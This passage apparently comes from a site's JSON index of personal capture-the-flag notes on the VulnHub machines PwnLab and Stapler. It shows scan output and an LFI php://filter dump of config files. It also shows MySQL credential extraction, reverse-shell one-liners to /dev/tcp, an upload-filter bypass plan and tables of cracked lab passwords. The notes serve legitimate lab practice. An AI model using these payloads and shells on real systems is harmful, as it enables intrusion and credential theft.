VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 1095.87 seconds  192.168.56.103 - 80 dir listing: http://192.168.56.103/images/\nold php version, terminate with null byte. http://192.168.56.103/config%00.php\nnikto nikto -h 192.168.56.103 -output scans/nikto.txt - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.56.103 + Target Hostname: 192.168.56.103 + Target Port: 80 + Start Time: 2020-01-07 17:36:33 (GMT1) --------------------------------------------------------------------------- + Server: Apache/2.4.10 (Debian) + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + No CGI Directories found (use '-C all' to force check all possible dirs) + Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + IP address found in the 'location' header. The IP is \u0026quot;127.0.1.1\u0026quot;. + OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is \u0026quot;127.0.1.1\u0026quot;. + Web Server returns a valid response with junk HTTP methods, this may cause false positives. + Cookie PHPSESSID created without the httponly flag + /config.php: PHP Config file may contain database IDs and passwords. + OSVDB-3268: /images/: Directory indexing found. + OSVDB-3233: /icons/README: Apache default file found. + /login.php: Admin login page/section found. + 7915 requests: 0 error(s) and 12 item(s) reported on remote host + End Time: 2020-01-07 17:37:41 (GMT1) (68 seconds) --------------------------------------------------------------------------- + 1 host(s) tested  gobuster root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab# ~/go/bin/gobuster dir -u http://192.168.56.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sql -t 40 -e -o scans/gobuster_dir_med-php-txt-html-sql.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://192.168.56.103/ [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: html,sql,php,txt [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/01/07 17:49:15 Starting gobuster =============================================================== http://192.168.56.103/index.php (Status: 200) http://192.168.56.103/images (Status: 301) http://192.168.56.103/upload (Status: 301) http://192.168.56.103/upload.php (Status: 200) http://192.168.56.103/login.php (Status: 200) http://192.168.56.103/config.php (Status: 200) http://192.168.56.103/server-status (Status: 403) =============================================================== 2020/01/07 17:51:26 Finished ===============================================================  kadimus root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# kadimus -u http://192.168.56.103/?page=login --parameter page --get-source --filename \u0026quot;config\u0026quot; -O config.php --proxy http://127.0.0.1:8080 (GET /?page=php://filter/convert.base64-encode/resource=config HTTP/1.1) _ __ _ _ | |/ /__ _ __| (_)_ __ ___ _ _ ___ | ' // _` |/ _` | | '_ ` _ \\| | | / __| | . \\ (_| | (_| | | | | | | | |_| \\__ \\ |_|\\_\\__,_|\\__,_|_|_| |_| |_|\\__,_|___/ v1.1 - LFI Scan \u0026amp; Exploit Tool (@hc0d3r - P0cL4bs Team) [19:37:04] [INFO] trying get source code of file: config [19:37:04] [INFO] valid base64 returned: [19:37:04] [INFO] check the output file \u0026lt;?php $server = \u0026quot;localhost\u0026quot;; $username = \u0026quot;root\u0026quot;; $password = \u0026quot;H4u%QJ_H99\u0026quot;; $database = \u0026quot;Users\u0026quot;; ?\u0026gt; root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# kadimus -u http://192.168.56.103/?page=login --parameter page --get-source --filename \u0026quot;login\u0026quot; -O login.php --proxy http://127.0.0.1:8080 _ __ _ _ | |/ /__ _ __| (_)_ __ ___ _ _ ___ | ' // _` |/ _` | | '_ ` _ \\| | | / __| | . \\ (_| | (_| | | | | | | | |_| \\__ \\ |_|\\_\\__,_|\\__,_|_|_| |_| |_|\\__,_|___/ v1.1 - LFI Scan \u0026amp; Exploit Tool (@hc0d3r - P0cL4bs Team) [21:18:41] [INFO] trying get source code of file: login [21:18:41] [INFO] valid base64 returned: [21:18:41] [INFO] check the output file \u0026lt;?php session_start(); require(\u0026quot;config.php\u0026quot;); $mysqli = new mysqli($server, $username, $password, $database); if (isset($_POST['user']) and isset($_POST['pass'])) { $luser = $_POST['user']; $lpass = base64_encode($_POST['pass']); $stmt = $mysqli-\u0026gt;prepare(\u0026quot;SELECT * FROM users WHERE user=? AND pass=?\u0026quot;); $stmt-\u0026gt;bind_param('ss', $luser, $lpass); $stmt-\u0026gt;execute(); $stmt-\u0026gt;store_Result(); if ($stmt-\u0026gt;num_rows == 1) { $_SESSION['user'] = $luser; header('Location: ?page=upload'); } else { echo \u0026quot;Login failed.\u0026quot;; } } else { ?\u0026gt; \u0026lt;form action=\u0026quot;\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt; \u0026lt;label\u0026gt;Username: \u0026lt;/label\u0026gt;\u0026lt;input id=\u0026quot;user\u0026quot; type=\u0026quot;test\u0026quot; name=\u0026quot;user\u0026quot;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;label\u0026gt;Password: \u0026lt;/label\u0026gt;\u0026lt;input id=\u0026quot;pass\u0026quot; type=\u0026quot;password\u0026quot; name=\u0026quot;pass\u0026quot;\u0026gt;\u0026lt;br /\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; name=\u0026quot;submit\u0026quot; value=\u0026quot;Login\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# kadimus -u http://192.168.56.103/?page=login --parameter page --get-source --filename \u0026quot;upload\u0026quot; -O upload.php #--proxy http://127.0.0.1:808 _ __ _ _ | |/ /__ _ __| (_)_ __ ___ _ _ ___ | ' // _` |/ _` | | '_ ` _ \\| | | / __| | . \\ (_| | (_| | | | | | | | |_| \\__ \\ |_|\\_\\__,_|\\__,_|_|_| |_| |_|\\__,_|___/ v1.1 - LFI Scan \u0026amp; Exploit Tool (@hc0d3r - P0cL4bs Team) [22:19:17] [INFO] trying get source code of file: upload [22:19:17] [INFO] valid base64 returned: [22:19:18] [INFO] check the output file \u0026lt;?php session_start(); if (!isset($_SESSION['user'])) { die('You must be log in.'); } ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action='' method='post' enctype='multipart/form-data'\u0026gt; \u0026lt;input type='file' name='file' id='file' /\u0026gt; \u0026lt;input type='submit' name='submit' value='Upload'/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php if(isset($_POST['submit'])) { if ($_FILES['file']['error'] \u0026lt;= 0) { $filename = $_FILES['file']['name']; $filetype = $_FILES['file']['type']; $uploaddir = 'upload/'; $file_ext = strrchr($filename, '.'); $imageinfo = getimagesize($_FILES['file']['tmp_name']); $whitelist = array(\u0026quot;.jpg\u0026quot;,\u0026quot;.jpeg\u0026quot;,\u0026quot;.gif\u0026quot;,\u0026quot;.png\u0026quot;); if (!(in_array($file_ext, $whitelist))) { die('Not allowed extension, please upload images only.'); } if(strpos($filetype,'image') === false) { die('Error 001'); } if($imageinfo['mime'] != 'image/gif' \u0026amp;\u0026amp; $imageinfo['mime'] != 'image/jpeg' \u0026amp;\u0026amp; $imageinfo['mime'] != 'image/jpg'\u0026amp;\u0026amp; $imageinfo['mime'] != 'image/png') { die('Error 002'); } if(substr_count($filetype, '/')\u0026gt;1){ die('Error 003'); } $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext; if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) { echo \u0026quot;\u0026lt;img src=\\\u0026quot;\u0026quot;.$uploadfile.\u0026quot;\\\u0026quot;\u0026gt;\u0026lt;br /\u0026gt;\u0026quot;; } else { die('Error 4'); } } } ?\u0026gt;  192.168.56.103 - 3306 mysql -u root --host 192.168.56.103 ERROR 1045 (28000): Access denied for user 'root'@'192.168.56.102' (using password: NO)  Exploit passwords Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 123 Server version: 5.5.47-0+deb8u1 (Debian) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. MySQL [(none)]\u0026gt; MySQL [(none)]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | Users | +--------------------+ 2 rows in set (0.001 sec) MySQL [(none)]\u0026gt; use Users Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [Users]\u0026gt; show tables; +-----------------+ | Tables_in_Users | +-----------------+ | users | +-----------------+ 1 row in set (0.001 sec) MySQL [Users]\u0026gt; select * from users; +------+------------------+ | user | pass | +------+------------------+ | kent | Sld6WHVCSkpOeQ== | | mike | U0lmZHNURW42SQ== | | kane | aVN2NVltMkdSbw== | +------+------------------+ 3 rows in set (0.001 sec) MySQL [(none)]\u0026gt; help; General information about MariaDB can be found at http://mariadb.org List of all MySQL commands: Note that all text commands must be first on line and end with ';' ? (\\?) Synonym for `help'. clear (\\c) Clear the current input statement. connect (\\r) Reconnect to the server. Optional arguments are db and host. delimiter (\\d) Set statement delimiter. edit (\\e) Edit command with $EDITOR. ego (\\G) Send command to mysql server, display result vertically. exit (\\q) Exit mysql. Same as quit. go (\\g) Send command to mysql server. help (\\h) Display this help. nopager (\\n) Disable pager, print to stdout. notee (\\t) Don't write into outfile. pager (\\P) Set PAGER [to_pager]. Print the query results via PAGER. print (\\p) Print current command. prompt (\\R) Change your mysql prompt. quit (\\q) Quit mysql. rehash (\\#) Rebuild completion hash. source (\\.) Execute an SQL script file. Takes a file name as an argument. status (\\s) Get status information from the server. system (\\!) Execute a system shell command. tee (\\T) Set outfile [to_outfile]. Append everything into given outfile. use (\\u) Use another database. Takes database name as argument. charset (\\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets. warnings (\\W) Show warnings after every statement. nowarning (\\w) Don't show warnings after every statement. For server side help, type 'help contents' MySQL [(none)]\u0026gt; tee No previous outfile available, you must give a filename!  root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# echo Sld6WHVCSkpOeQ== | base64 -d JWzXuBJJNy root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# echo U0lmZHNURW42SQ== | base64 -d SIfdsTEn6I root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# echo aVN2NVltMkdSbw== | base64 -d iSv5Ym2GRo  mysql shell to local shell I was today years old when I learned that system command of mysql runs LOCAL not remote.\nroot@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# nc -nlvp 808 listening on [any] 808 ... 192.168.56.102: inverse host lookup failed: Unknown host connect to [192.168.56.102] from (UNKNOWN) [192.168.56.102] 36662  MySQL [(none)]\u0026gt; system ERROR: Usage: \\! shell-command MySQL [(none)]\u0026gt; system ls config.php login.php MySQL [(none)]\u0026gt; system bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.56.102/808 0\u0026gt;\u0026amp;1 sh: 1: Syntax error: Bad fd number MySQL [(none)]\u0026gt; system sh -i \u0026gt;\u0026amp; /dev/tcp/192.168.56.102/808 0\u0026gt;\u0026amp;1 sh: 1: Syntax error: Bad fd number MySQL [(none)]\u0026gt; system bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.56.102/808 0\u0026gt;\u0026amp;1\u0026quot;  upload via web use creds from DB. Login.\nupload page checks 3 things.\n Extensions image file type with [\u0026lsquo;type\u0026rsquo;] mime data with getimagesize  so upload a shell.jpg.php with a magic byte\n$filename = $_FILES['file']['name']; $filetype = $_FILES['file']['type']; $uploaddir = 'upload/'; $file_ext = strrchr($filename, '.'); $imageinfo = getimagesize($_FILES['file']['tmp_name']); $whitelist = array(\u0026quot;.jpg\u0026quot;,\u0026quot;.jpeg\u0026quot;,\u0026quot;.gif\u0026quot;,\u0026quot;.png\u0026quot;); if (!(in_array($file_ext, $whitelist))) { die('Not allowed extension, please upload images only.'); } if(strpos($filetype,'image') === false) { die('Error 001'); } if($imageinfo['mime'] != 'image/gif' \u0026amp;\u0026amp; $imageinfo['mime'] != 'image/jpeg' \u0026amp;\u0026amp; $imageinfo['mime'] != 'image/jpg'\u0026amp;\u0026amp; $imageinfo['mime'] != 'image/png') { die('Error 002'); } if(substr_count($filetype, '/')\u0026gt;1){ die('Error 003'); }  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnhub/stapler/",
	"title": "Stapler",
	"tags": ["VulnHub"],
	"description": "Notes from the Stapler machine from Vulnhub.",
	"content": "stapler Info overview Machine    Hostname workgroup OS     RED WORKGROUP     Ports and services    port Service/URL Info     20,21/tcp ftp vsftpd 2.0.8 or later (vsFTPd 3.0.3 ?) Anonymous FTP login allowed    22/tcp ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)    53/tcp\u0026amp;udp dns dnsmasq-2.75    69/udp tftp tftp    80/tcp http PHP cli server 5.5 or later    123/tcp ntp    139/tcp smb Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP) shares print$ Mapping: DENIED, Listing: N/A kathy Mapping: OK, Listing: OK tmp Mapping: OK, Listing: OK IPC$ NT_STATUS_OBJECT_NAME_NOT_FOUND listing *    666/tcp zip file see message2.jpg    3306/tcp mysql MySQL 5.7.12-0ubuntu1 Auth Plugin Name: mysql_native_password Salt: K \\x18Z\\x01F\u0026gt;\\x1FNku\u0026rsquo;%@\\x1D7p\\x1Fi Some Capabilities: FoundRows, InteractiveClient, Support41Auth, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, ODBCClient, ConnectWithDatabase, Speaks41ProtocolOld, SupportsLoadDataLocal, Speaks41ProtocolNew, LongPassword, SupportsCompression, SupportsTransactions, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins   12380/tcp http/https Apache httpd 2.4.18 ((Ubuntu)) Content differs between http and https    Users, hashes and Passwords users    users Unix ftp wp     peter [x] [] [x]   RNunemaker [x] [] []   ETollefson [x] [] []   DSwanger [x] [] []   AParnell [x] [] []   SHayslett [x] [] []   MBassin [x] [] []   JBare [x] [] []   LSolum [x] [] []   IChadwick [x] [] []   MFrei [x] [] []   SStroud [x] [] []   CCeaser [x] [] []   JKanode [x] [] []   CJoo [x] [] []   Eeth [x] [] []   LSolum2 [x] [] []   JLipps [x] [] []   jamie [x] [] []   Sam [x] [] []   Drew [x] [] []   jess [x] [] []   SHAY [x] [] []   Taylor [x] [] []   mel [x] [] []   kai [x] [] []   zoe [x] [] []   NATHAN [x] [] []   www [x] [] []   elly [x] [x] [x]   harry [] [x] [x]   john [] [x] [x]   scott [] [] [x]   barry [] [] [x]   heather [] [] [x]   garry [] [] [x]   harry [] [] [x]   kathy [] [] [x]   tim [] [] [x]   pam [] [] []    passwords    Creds how did i get it what can it access/info     SHayslett:SHayslett ssh brute ssh user   elly:ylle ftp brute ftp \u0026lsquo;power\u0026rsquo; user (ssh-\u0026gt; su) user   harry:monkey wp brute    garry:football wp brute    harry:monkey wp brute    scott:cookie wp brute    kathy:coolgirl wp brute    john:incorrect wp brute wp admin   root:plbkac LFI-\u0026gt;wp-config.php root on mysql/phpmyadmin   barry:washere dbdump-\u0026gt;hashcat    heather:passphras dbdump-\u0026gt;hashcat    tim:thumb dbdump-\u0026gt;hashcat    ZOE:partyqueen dbdump-\u0026gt;hashcat    dave:damachine dbdump-\u0026gt;hashcat    simon:TOM dbdump-\u0026gt;hashcat    pam:0520 dbdump-\u0026gt;hashcat info on site (birthday)    mike:12345 dbdump-\u0026gt;hashcat found in \u0026lsquo;loot\u0026rsquo; db   peter:JZQuyIN5 found in history file     hashes    user hash cracked     John $P$B7889EMq/erHIuZapMB8GEizebcIy9. incorrect   Elly $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 ylle   Peter $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0    barry $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 washere   heather $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 passphrase   garry $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 football   harry $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 monkey   scott $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 cookie   kathy $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 coolgirl   tim $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 thumb   ZOE $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 partyqueen   Dave $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. damachine   Simon $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 TOM   Abby $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs.    Vicki $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131    Pam $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 0520    Vulns    Potential Vulns Verified     WordPress Plugin Advanced Video 1.0 - Local File Inclusion [x]    where you at 192.168.56.10\nnmap -sn -PR 192.168.56.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 21:28 CET Nmap scan report for 192.168.56.1 Host is up (0.00019s latency). MAC Address: 0A:00:27:00:00:0A (Unknown) Nmap scan report for 192.168.56.100 Host is up (0.000088s latency). MAC Address: 08:00:27:42:9E:F7 (Oracle VirtualBox virtual NIC) Nmap scan report for 192.168.56.101 Host is up (0.00017s latency). MAC Address: 08:00:27:F0:51:B2 (Oracle VirtualBox virtual NIC) Nmap scan report for 192.168.56.102 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 2.09 seconds  what you got TCP root@kali:~/Documents/stapler# nmap -p- -A 192.168.56.101 -oA tcp Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 21:36 CET Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 3.71% done; ETC: 21:39 (0:03:28 remaining) Nmap scan report for 192.168.56.101 Host is up (0.00050s latency). Not shown: 65523 filtered ports PORT STATE SERVICE VERSION 20/tcp closed ftp-data 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Cant get directory listing: PASV failed: 550 Permission denied. | ftp-syst: | STAT: | FTP server status: | Connected to 192.168.56.102 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA) | 256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA) |_ 256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519) 53/tcp open domain dnsmasq 2.75 | dns-nsid: |_ bind.version: dnsmasq-2.75 80/tcp open http PHP cli server 5.5 or later |_http-title: 404 Not Found 123/tcp closed ntp 137/tcp closed netbios-ns 138/tcp closed netbios-dgm 139/tcp open netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP) 666/tcp open doom? | fingerprint-strings: | NULL: | message2.jpgUT | QWux | DL[E | #;3[ | \\xf6 | u([r | qYQq | Y_?n2 | 3\u0026amp;M~{ | 9-a)T | L}AJ |_ .npy.9 3306/tcp open mysql MySQL 5.7.12-0ubuntu1 | mysql-info: | Protocol: 10 | Version: 5.7.12-0ubuntu1 | Thread ID: 11 | Capabilities flags: 63487 | Some Capabilities: FoundRows, InteractiveClient, Support41Auth, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, ODBCClient, ConnectWithDatabase, Speaks41ProtocolOld, SupportsLoadDataLocal, Speaks41ProtocolNew, LongPassword, SupportsCompression, SupportsTransactions, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins | Status: Autocommit | Salt: K \\x18Z\\x01F\u0026gt;\\x1FNku'\\%@\\x1D7p\\x1Fi |_ Auth Plugin Name: mysql_native_password 12380/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Tim, we need to-do better next year for Initech 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port666-TCP:V=7.80%I=7%D=1/5%Time=5E124931%P=x86_64-pc-linux-gnu%r(NULL SF:,10F8,\u0026quot;PK\\x03\\x04\\x14\\0\\x02\\0\\x08\\0d\\x80\\xc3Hp\\xdf\\x15\\x81\\xaa,\\0\\0\\x15 SF:2\\0\\0\\x0c\\0\\x1c\\0message2\\.jpgUT\\t\\0\\x03\\+\\x9cQWJ\\x9cQWux\\x0b\\0\\x01\\x04 SF:\\xf5\\x01\\0\\0\\x04\\x14\\0\\0\\0\\xadz\\x0bT\\x13\\xe7\\xbe\\xefP\\x94\\x88\\x88A@\\xa2 SF:\\x20\\x19\\xabUT\\xc4T\\x11\\xa9\\x102\u0026gt;\\x8a\\xd4RDK\\x15\\x85Jj\\xa9\\\u0026quot;DL\\[E\\xa2\\x SF:0c\\x19\\x140\u0026lt;\\xc4\\xb4\\xb5\\xca\\xaen\\x89\\x8a\\x8aV\\x11\\x91W\\xc5H\\x20\\x0f\\xb SF:2\\xf7\\xb6\\x88\\n\\x82@%\\x99d\\xb7\\xc8#;3\\[\\r_\\xcddr\\x87\\xbd\\xcf9\\xf7\\xaeu\\ SF:xeeY\\xeb\\xdc\\xb3oX\\xacY\\xf92\\xf3e\\xfe\\xdf\\xff\\xff\\xff=2\\x9f\\xf3\\x99\\xd3 SF:\\x08y}\\xb8a\\xe3\\x06\\xc8\\xc5\\x05\\x82\u0026gt;`\\xfe\\x20\\xa7\\x05:\\xb4y\\xaf\\xf8\\xa0 SF:\\xf8\\xc0\\^\\xf1\\x97sC\\x97\\xbd\\x0b\\xbd\\xb7nc\\xdc\\xa4I\\xd0\\xc4\\+j\\xce\\[\\x8 SF:7\\xa0\\xe5\\x1b\\xf7\\xcc=,\\xce\\x9a\\xbb\\xeb\\xeb\\xdds\\xbf\\xde\\xbd\\xeb\\x8b\\xf SF:4\\xfdis\\x0f\\xeeM\\?\\xb0\\xf4\\x1f\\xa3\\xcceY\\xfb\\xbe\\x98\\x9b\\xb6\\xfb\\xe0\\xd SF:c\\]sS\\xc5bQ\\xfa\\xee\\xb7\\xe7\\xbc\\x05AoA\\x93\\xfe9\\xd3\\x82\\x7f\\xcc\\xe4\\xd5 SF:\\x1dx\\xa2O\\x0e\\xdd\\x994\\x9c\\xe7\\xfe\\x871\\xb0N\\xea\\x1c\\x80\\xd63w\\xf1\\xaf SF:\\xbd\u0026amp;\u0026amp;q\\xf9\\x97'i\\x85fL\\x81\\xe2\\\\\\xf6\\xb9\\xba\\xcc\\x80\\xde\\x9a\\xe1\\xe2:\\ SF:xc3\\xc5\\xa9\\x85`\\x08r\\x99\\xfc\\xcf\\x13\\xa0\\x7f{\\xb9\\xbc\\xe5:i\\xb2\\x1bk\\x SF:8a\\xfbT\\x0f\\xe6\\x84\\x06/\\xe8-\\x17W\\xd7\\xb7\u0026amp;\\xb9N\\x9e\u0026lt;\\xb1\\\\\\.\\xb9\\xcc\\x SF:e7\\xd0\\xa4\\x19\\x93\\xbd\\xdf\\^\\xbe\\xd6\\xcdg\\xcb\\.\\xd6\\xbc\\xaf\\|W\\x1c\\xfd\\ SF:xf6\\xe2\\x94\\xf9\\xebj\\xdbf~\\xfc\\x98x'\\xf4\\xf3\\xaf\\x8f\\xb9O\\xf5\\xe3\\xcc\\x SF:9a\\xed\\xbf`a\\xd0\\xa2\\xc5KV\\x86\\xad\\n\\x7fou\\xc4\\xfa\\xf7\\xa37\\xc4\\|\\xb0\\x SF:f1\\xc3\\x84O\\xb6nK\\xdc\\xbe#\\)\\xf5\\x8b\\xdd{\\xd2\\xf6\\xa6g\\x1c8\\x98u\\(\\[r\\x SF:f8H~A\\xe1qYQq\\xc9w\\xa7\\xbe\\?}\\xa6\\xfc\\x0f\\?\\x9c\\xbdTy\\xf9\\xca\\xd5\\xaak\\ SF:xd7\\x7f\\xbcSW\\xdf\\xd0\\xd8\\xf4\\xd3\\xddf\\xb5F\\xabk\\xd7\\xff\\xe9\\xcf\\x7fy\\x SF:d2\\xd5\\xfd\\xb4\\xa7\\xf7Y_\\?n2\\xff\\xf5\\xd7\\xdf\\x86\\^\\x0c\\x8f\\x90\\x7f\\x7f\\ SF:xf9\\xea\\xb5m\\x1c\\xfc\\xfef\\\u0026quot;\\.\\x17\\xc8\\xf5\\?B\\xff\\xbf\\xc6\\xc5,\\x82\\xcb\\[ SF:\\x93\u0026amp;\\xb9NbM\\xc4\\xe5\\xf2V\\xf6\\xc4\\t3\u0026amp;M~{\\xb9\\x9b\\xf7\\xda-\\xac\\]_\\xf9\\xc SF:c\\[qt\\x8a\\xef\\xbao/\\xd6\\xb6\\xb9\\xcf\\x0f\\xfd\\x98\\x98\\xf9\\xf9\\xd7\\x8f\\xa7 SF:\\xfa\\xbd\\xb3\\x12_@N\\x84\\xf6\\x8f\\xc8\\xfe{\\x81\\x1d\\xfb\\x1fE\\xf6\\x1f\\x81\\x SF:fd\\xef\\xb8\\xfa\\xa1i\\xae\\.L\\xf2\\\\g@\\x08D\\xbb\\xbfp\\xb5\\xd4\\xf4Ym\\x0bI\\x96 SF:\\x1e\\xcb\\x879-a\\)T\\x02\\xc8\\$\\x14k\\x08\\xae\\xfcZ\\x90\\xe6E\\xcb\u0026lt;C\\xcap\\x8f\\ SF:xd0\\x8f\\x9fu\\x01\\x8dvT\\xf0'\\x9b\\xe4ST%\\x9f5\\x95\\xab\\rSWb\\xecN\\xfb\u0026amp;\\xf4\\ SF:xed\\xe3v\\x13O\\xb73A#\\xf0,\\xd5\\xc2\\^\\xe8\\xfc\\xc0\\xa7\\xaf\\xab4\\xcfC\\xcd\\x SF:88\\x8e}\\xac\\x15\\xf6~\\xc4R\\x8e`wT\\x96\\xa8KT\\x1cam\\xdb\\x99f\\xfb\\n\\xbc\\xbc SF:L}AJ\\xe5H\\x912\\x88\\(O\\0k\\xc9\\xa9\\x1a\\x93\\xb8\\x84\\x8fdN\\xbf\\x17\\xf5\\xf0\\ SF:.npy\\.9\\x04\\xcf\\x14\\x1d\\x89Rr9\\xe4\\xd2\\xae\\x91#\\xfbOg\\xed\\xf6\\x15\\x04\\x SF:f6~\\xf1\\]V\\xdcBGu\\xeb\\xaa=\\x8e\\xef\\xa4HU\\x1e\\x8f\\x9f\\x9bI\\xf4\\xb6GTQ\\xf SF:3\\xe9\\xe5\\x8e\\x0b\\x14L\\xb2\\xda\\x92\\x12\\xf3\\x95\\xa2\\x1c\\xb3\\x13\\*P\\x11\\? SF:\\xfb\\xf3\\xda\\xcaDfv\\x89`\\xa9\\xe4k\\xc4S\\x0e\\xd6P0\u0026quot;); MAC Address: 08:00:27:F0:51:B2 (Oracle VirtualBox virtual NIC) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: 59m59s, deviation: 0s, median: 59m58s |_nbstat: NetBIOS name: RED, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.9-Ubuntu) | Computer name: red | NetBIOS computer name: RED\\x00 | Domain name: \\x00 | FQDN: red |_ System time: 2020-01-05T21:38:22+00:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-01-05T21:38:22 |_ start_date: N/A TRACEROUTE HOP RTT ADDRESS 1 0.50 ms 192.168.56.101 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 161.58 seconds root@kali:~/Documents/stapler#  UDP root@kali:~/Documents/stapler# nmap -sU -A 192.168.56.101 -oA udp Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-05 21:34 CET Nmap scan report for 192.168.56.101 Host is up (0.0020s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 53/udp open domain dnsmasq 2.75 | dns-nsid: |_ bind.version: dnsmasq-2.75 68/udp open|filtered dhcpc 69/udp open|filtered tftp 137/udp open netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP) 138/udp open|filtered netbios-dgm MAC Address: 08:00:27:F0:51:B2 (Oracle VirtualBox virtual NIC) Too many fingerprints match this host to give specific OS details Network Distance: 1 hop Service Info: Host: RED Host script results: |_nbstat: NetBIOS name: RED, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) TRACEROUTE HOP RTT 